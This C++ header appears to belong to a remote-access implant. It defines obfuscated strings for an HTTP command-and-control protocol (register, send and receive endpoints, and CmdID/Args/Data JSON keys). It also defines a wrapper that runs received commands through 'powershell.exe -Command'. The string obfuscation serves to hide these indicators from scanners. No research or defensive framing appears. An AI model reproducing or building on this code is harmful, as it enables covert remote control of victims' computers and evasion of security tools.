#pragma once
#ifndef _KEYWORD_H_
#define _KEYWORD_H_

#include <string>
#include "Obfuscation.h"

struct URI {
    std::wstring Send;
    std::wstring Recv;
    std::wstring Regi;
};

struct METHOD
{
    const wchar_t* doGet;
    const wchar_t* doPost;
};

struct JSONKEY
{
    const char*    CmdIDKeyWord;
    const char*    ArgsKeyWord;
    const char*    DataKeyWord;

};

const METHOD Method = {
    (const wchar_t*)WOBF(L"GET"),
    (const wchar_t*)WOBF(L"POST")
};

const URI uri{
    std::wstring(WOBF(L"/send")),
    std::wstring(WOBF(L"/recv")),
    std::wstring(WOBF(L"/register"))
};

const JSONKEY jsonKey = {
    (const char*)OBF("CmdID"),
    (const char*)OBF("Args"),
    (const char*)OBF("Data")
};


static const wchar_t* headerKeyString = WOBF(L"Content-Type: application/json");
static const char*    closeKeyWord    = OBF("close");
static const char*    prefixKeyWord   = OBF("powershell.exe -Command \"& {");
static const char*    suffixKeyWord   = OBF("}\"");
static const char*    successKeyWord  = OBF("Command executed successfully");
static const char*    failKeyWord     = OBF("Command execution failed");

#endif